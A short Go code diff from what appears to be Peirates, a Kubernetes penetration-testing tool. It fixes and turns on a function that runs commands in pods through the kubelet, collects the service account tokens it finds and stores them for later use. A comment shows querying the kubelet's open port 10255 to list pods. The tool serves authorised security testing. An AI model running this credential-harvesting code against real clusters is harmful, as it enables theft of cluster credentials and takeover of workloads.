@@ -901,8 +901,8 @@ func GetNodesInfo(connectionString ServerInfo) {
 	}
 }
 
-func ExecuteCodeOnKubelet(connectionString ServerInfo, ServiceAccounts *[]ServerInfo) {
-	fmt.Println("+ Getting IP addess for the nodes in the cluster")
+func ExecuteCodeOnKubelet(connectionString ServerInfo, ServiceAccounts *[]ServiceAccount) {
+	fmt.Println("+ Getting IP addresses for the nodes in the cluster...")
 	nodeDetailOut, _, err := runKubectlSimple(connectionString, "get", "nodes", "-o", "json")
 	println(nodeDetailOut)
 
@@ -988,10 +988,9 @@ func ExecuteCodeOnKubelet(connectionString ServerInfo, ServiceAccounts *[]Server
 								token := string(body_exec_command)
 								println("[+] Got service account token for", "ns:"+podNamespace+" pod:"+podName+" container:"+containerName+":", token)
 								println("")
-								// name := "ns:" + podNamespace + ":" + podName
-								// serviceAccount := makeNewServiceAccount(name, token, "kubelet")
-								// serviceAccounts = append(serviceAccounts, serviceAccount)
-								println("FIXME: serviceAccounts undefined?")
+								name := "ns:" + podNamespace + ":" + podName
+								serviceAccount := makeNewServiceAccount(name, token, "kubelet")
+								*ServiceAccounts = append(*ServiceAccounts, serviceAccount)
 							}
 						}
 					}
@@ -1581,7 +1580,7 @@ Peirates:># `)
 			// Use kubectl get nodes to get a list of nodes
 			// ---->  GetNodesInfo(connectionString)
 			// Use kubectl get node _name_ -o yaml to get IP addresses
-			//ExecuteCodeOnKubelet(connectionString, &serviceAccounts)
+			ExecuteCodeOnKubelet(connectionString, &serviceAccounts)
 			// Find a line that matches - address: IP
 			// curl port 10255 to get pods: curl -sk http://10.23.58.41:10255/pods
 
